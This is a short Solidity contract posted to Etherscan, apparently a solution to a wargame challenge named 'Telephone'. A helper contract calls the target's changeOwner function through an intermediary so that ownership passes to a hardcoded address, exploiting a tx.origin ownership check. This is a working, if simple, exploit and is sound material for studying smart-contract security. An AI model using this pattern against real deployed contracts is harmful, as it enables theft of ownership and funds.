/**
 *Submitted for verification at Etherscan.io on 2023-03-12
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    function changeOwner(address _owner) public {}
}

contract TelephoneHelper {

  address telephoneAddress = 0x0F07D4a5B320e4bDA1E377C3844F498B20b661f8;
  address hhrAddress = 0x267749CF2e3fABE40b9761d5bf3745d98Dbae084;
  Telephone telephone;

  constructor() {
    telephone = Telephone(telephoneAddress);
  }

  function ChangeOwnerHelper() public {
    telephone.changeOwner(hhrAddress);
  }
}